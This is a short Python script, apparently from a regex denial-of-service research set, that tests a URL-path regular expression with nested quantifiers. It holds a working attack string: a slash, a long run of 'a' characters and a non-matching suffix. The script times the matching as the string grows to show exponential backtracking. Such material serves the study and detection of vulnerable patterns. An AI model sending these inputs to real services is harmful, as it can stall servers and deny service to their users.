# 8388
# ^(/(?:(?:(?:(?:[a-zA-Z0-9\\-_.!~*'():\@&=+\$,]+|(?:%[a-fA-F0-9][a-fA-F0-9]))*)(?:;(?:(?:[a-zA-Z0-9\\-_.!~*'():\@&=+\$,]+|(?:%[a-fA-F0-9][a-fA-F0-9]))*))*)(?:/(?:(?:(?:[a-zA-Z0-9\\-_.!~*'():\@&=+\$,]+|(?:%[a-fA-F0-9][a-fA-F0-9]))*)(?:;(?:(?:[a-zA-Z0-9\\-_.!~*'():\@&=+\$,]+|(?:%[a-fA-F0-9][a-fA-F0-9]))*))*))*))$
# EXPONENT
# nums:4
# EXPONENT AttackString:"/"+"a"*32+"◎@! _1_NQ"

import re
from time import perf_counter

regex = """^(/(?:(?:(?:(?:[a-zA-Z0-9\\-_.!~*'():\@&=+\$,]+|(?:%[a-fA-F0-9][a-fA-F0-9]))*)(?:;(?:(?:[a-zA-Z0-9\\-_.!~*'():\@&=+\$,]+|(?:%[a-fA-F0-9][a-fA-F0-9]))*))*)(?:/(?:(?:(?:[a-zA-Z0-9\\-_.!~*'():\@&=+\$,]+|(?:%[a-fA-F0-9][a-fA-F0-9]))*)(?:;(?:(?:[a-zA-Z0-9\\-_.!~*'():\@&=+\$,]+|(?:%[a-fA-F0-9][a-fA-F0-9]))*))*))*))$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "/" + "a" * i * 1 + "◎@! _1_NQ"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")